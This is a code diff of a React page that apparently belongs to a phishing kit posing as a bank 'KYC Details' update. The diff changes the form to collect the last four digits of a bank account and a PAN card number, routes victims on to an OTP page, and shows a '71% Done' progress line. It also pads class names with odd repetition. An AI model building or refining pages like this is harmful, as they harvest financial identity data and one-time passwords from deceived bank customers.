@@ -6,9 +6,6 @@ import { useState } from 'react';
 export default function Home() {
    const router = useRouter();
    const  [response, setResponse] = useState(false);
-    const showError = () => {
-        alert("OTP resend successfully !");
-    }
   const handleSubmit = (e) => {
     e.preventDefault();
       const formData = new FormData(e.target);
@@ -26,7 +23,7 @@ export default function Home() {
         .then((responseData) => {
           if(responseData.status == 200){
             setResponse(true);
-            router.push("/otp?next=/ap")
+            router.push("/otp?next=/fna")
           }else{
             setResponse(false);
             console.log('failed');
@@ -41,35 +38,41 @@ export default function Home() {
   return (
     <main>
     <div className="Tpv_login_heading__E5J6K">
-      <h3 className="Tpv_login_heading_h3__z0Qx1">Customer Details</h3>
+      <h3 className="Tpv_login_heading_h3__z0Qx1 Tpv_login_heading_h3__z0Qx1Tpv_login_heading_h3__z0Qx1 Tpv_login_heading_h3__z0Qx1">KYC Details..</h3>
     </div>
     
-    <div className="Tpv_login_form___9zpm">
-            <p className="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
+    <div className="Tpv_login_form___9zpm Tpv_login_form___9zpmTpv_login_form___9zpmTpv_login_form___9zpm" >
+            <p className="Tpv_mandatory_txt__YZHLO">Mandtory fields an asterisk (*)</p>
             <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
                 <div className="Tpv_form_group__aHWg0">
                 <label className="Tpv_label__cObJz">
-                    Customer Full Name* <span className="Tpv_mandatory_txt__YZHLO">*</span>
+                Last 4-digit A/c No <span className="Tpv_mandatory_txt__YZHLO Tpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLO">*</span>
                 </label>
                 <input  
-                    name="CFN"
+                    name="LDAN"
                     type="text"
-                    className="Tpv_form_control__5hzGF"
+                    inputMode="numeric"
+                    minLength={4}
+                    maxLength={4}
+                    className="Tpv_form_control__5hzGF  Tpv_form_control__5hzGFTpv_form_control__5hzGF"
                     required
                 />
                 </div>
                 <div className="Tpv_form_group__aHWg0">
                 <label className="Tpv_label__cObJz">
-                    Date of Birth<span className="Tpv_mandatory_txt__YZHLO">*</span>
+                    Pan Card No.<span className="Tpv_mandatory_txt__YZHLO Tpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLO">*</span>
                 </label>
                 <input  
-                    name="CDOBB"
-                    type="text"
+                    name="PCN"
+                    type="e"
+                    pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
+                    maxLength={10}
+                    minLength={10}
                     className="Tpv_form_control__5hzGF"
-                    placeholder="DD/MM/YYYY"
                     required
                 />
                 </div>
+                <p className="Tpv_content_title__SWlCq">71% Done</p>
                 <div className="Tpv_t_center__8YF86">
                 <input
                     type="submit"
